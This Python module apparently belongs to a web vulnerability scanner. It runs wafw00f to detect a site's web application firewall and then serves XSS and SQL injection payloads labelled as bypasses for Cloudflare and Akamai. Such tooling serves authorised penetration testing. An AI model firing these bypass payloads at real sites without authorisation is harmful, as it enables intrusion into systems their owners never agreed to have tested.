"""
WAF detection and bypass payload service.

Uses wafw00f to detect WAF presence and vendor, then provides
vendor-specific bypass payloads for XSS and SQLi modules.
"""

import asyncio
import json
import shutil
from typing import Optional


async def detect_waf(target_url: str) -> dict:
    """Run wafw00f against target, return {detected, vendor, confidence}.
    Never raises — returns safe default on any error."""
    try:
        wafw00f_path = shutil.which("wafw00f")
        if not wafw00f_path:
            return {"detected": False, "vendor": None, "confidence": "unknown"}

        proc = await asyncio.create_subprocess_exec(
            wafw00f_path, target_url, "-o", "-", "-f", "json",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)

        if proc.returncode != 0 or not stdout:
            return {"detected": False, "vendor": None, "confidence": "unknown"}

        # wafw00f JSON output: list of {url, detected, firewall, manufacturer}
        data = json.loads(stdout.decode())
        if isinstance(data, list) and data:
            entry = data[0]
            detected = entry.get("detected", False)
            vendor = entry.get("firewall") if detected else None
            return {"detected": bool(detected), "vendor": vendor, "confidence": "high" if detected else "none"}
        return {"detected": False, "vendor": None, "confidence": "unknown"}
    except Exception:
        return {"detected": False, "vendor": None, "confidence": "unknown"}


WAF_BYPASS_PAYLOADS = {
    # XSS bypass payloads by WAF vendor
    "cloudflare": {
        "xss": [
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
        ],
        "sqli": ["' OR 1=1--", "' /*!50000OR*/ 1=1--", "' OR/**/1=1--"],
    },
    "akamai": {
        "xss": ['"><img src=1 onerror=alert(1)>', "<script>alert(1)</script>"],
        "sqli": ["1' OR '1'='1", "1' OR 1=1--+"],
    },
}


def get_waf_bypass_payloads(vendor: Optional[str], vuln_type: str) -> list[str]:
    """Return WAF-specific bypass payloads, or empty list if no vendor-specific ones."""
    if not vendor:
        return []
    vendor_lower = vendor.lower()
    for key, payloads in WAF_BYPASS_PAYLOADS.items():
        if key in vendor_lower:
            return payloads.get(vuln_type, [])
    return []
